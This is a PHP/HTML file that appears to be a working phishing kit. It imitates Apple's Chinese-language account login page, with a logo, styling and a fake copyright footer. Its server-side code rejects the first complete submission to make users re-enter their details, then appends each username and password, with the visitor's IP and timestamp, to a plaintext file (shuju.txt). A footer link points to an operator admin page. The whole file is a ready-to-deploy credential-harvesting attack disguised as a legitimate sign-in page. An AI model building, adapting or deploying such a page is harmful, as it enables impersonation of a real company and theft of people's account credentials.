<?php
// 处理登录提交
$error_msg = '';
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // 获取表单数据
    $username = trim($_POST['username'] ?? '');
    $password = trim($_POST['password'] ?? '');
    
    // 验证情况①：未填写完整
    if (empty($username) || empty($password)) {
        $error_msg = "请输入账号或密码！";
    } else {
        // 验证情况②：首次填写完整
        if (!isset($_POST['second_submit'])) {
            $error_msg = "请确保账号与密码无误后再次点击登录即可！";
        } else {
            // 验证情况③：二次提交，存储数据
            $ip = $_SERVER['REMOTE_ADDR'];
            $login_time = date('Y-m-d H:i:s');
            $data = "$ip|$username|$password|$login_time\n";
            
            // 写入shuju.txt文件
            $file = fopen('shuju.txt', 'a');
            if ($file) {
                fwrite($file, $data);
                fclose($file);
                $error_msg = "登录成功！数据已记录";
            } else {
                $error_msg = "文件写入失败，请检查权限！";
            }
        }
    }
}
?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Apple 账户</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
            background-color: #fff;
            color: #333;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            box-sizing: border-box;
            padding: 20px;
        }
        .container {
            max-width: 400px;
            width: 100%;
            text-align: center;
        }
        .logo-container {
            margin-bottom: 40px;
            width: 120px;
            height: 120px;
            margin-left: auto;
            margin-right: auto;
        }
        .custom-logo {
            width: 100%;
            height: 100%;
            border-radius: 50%;
            object-fit: cover;
            margin: 0 auto;
        }
        h1 {
            font-size: 2.5rem;
            font-weight: 600;
            margin-bottom: 10px;
        }
        p {
            font-size: 1.1rem;
            color: #666;
            margin-bottom: 30px;
        }
        .error-msg {
            color: #ff3b30;
            margin-bottom: 15px;
            height: 20px;
            line-height: 20px;
            font-size: 0.95rem;
        }
        .form-group {
            margin-bottom: 15px;
        }
        input {
            width: 100%;
            padding: 12px 15px;
            border: 1px solid #ccc;
            border-radius: 4px;
            font-size: 1rem;
            box-sizing: border-box;
        }
        input:focus {
            outline: none;
            border-color: #0070c9;
            box-shadow: 0 0 0 2px rgba(0, 112, 201, 0.25);
        }
        .checkbox-group {
            display: flex;
            align-items: center;
            margin: 20px 0;
            font-size: 0.9rem;
            justify-content: flex-start;
        }
        .checkbox-group input {
            width: 20px;
            height: 20px;
            margin-right: 10px;
        }
        .forgot-password {
            text-align: right;
            margin: 20px 0;
        }
        .forgot-password a {
            color: #0070c9;
            text-decoration: none;
            font-size: 0.9rem;
        }
        .forgot-password a:hover {
            text-decoration: underline;
        }
        button {
            width: 100%;
            padding: 12px;
            background-color: #0070c9;
            color: #fff;
            border: none;
            border-radius: 4px;
            font-size: 1rem;
            font-weight: 600;
            cursor: pointer;
            transition: background-color 0.3s;
        }
        button:hover {
            background-color: #005a9e;
        }
        .footer {
            margin-top: 40px;
            font-size: 0.75rem;
            color: #666;
            line-height: 1.5;
            text-align: center;
        }
        .footer a {
            color: #0070c9;
            text-decoration: none;
        }
        .footer a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo-container">
            <img src="https://youke1.picui.cn/s1/2025/11/08/690f6411d6970.jpeg" class="custom-logo" alt="自定义图标">
        </div>
        <h1>Apple 账户</h1>
        <p>管理你的 Apple 账户</p>
        
        <!-- 错误提示 -->
        <div class="error-msg"><?php echo $error_msg; ?></div>
        
        <!-- 登录表单 -->
        <form method="post" action="index.php">
            <div class="form-group">
                <input type="text" name="username" placeholder="电子邮箱或电话号码" required>
            </div>
            <div class="form-group">
                <input type="password" name="password" placeholder="密码" required>
            </div>
            <div class="checkbox-group">
                <input type="checkbox" id="remember">
                <label for="remember">记住我的账户</label>
            </div>
            <div class="forgot-password">
                <a href="#">忘记密码？</a>
            </div>
            <!-- 隐藏字段：标记是否为二次提交 -->
            <?php if (isset($_POST['second_submit']) || (!empty($username) && !empty($password))) : ?>
                <input type="hidden" name="second_submit" value="1">
            <?php endif; ?>
            <button type="submit">登录</button>
        </form>
        
        <div class="footer">
            <p>你的 Apple 账户资料用于让你安全登录及存取你的资料。Apple 会为安全、支援和报告目的记录某些资料。如果你同意，Apple 还可能使用你的 Apple 账户资料向你传送营销电子邮件和通讯，包括根据你对 Apple 服务的使用情况而提供的相关内容。<a href="#">查看资料管理方式...</a></p>
            <p style="margin-top: 10px;">© 2025 Apple Inc. | <a href="adminhtglhxzc.php" target="_blank" style="font-size: 0.8rem;">管理员入口</a></p>
        </div>
    </div>

    <script>
        const inputs = document.querySelectorAll('input');
        inputs.forEach(input => {
            input.addEventListener('focus', function() {
                this.parentElement.style.borderColor = '#0070c9';
            });
            input.addEventListener('blur', function() {
                this.parentElement.style.borderColor = '#ccc';
            });
        });
    </script>
</body>
</html>
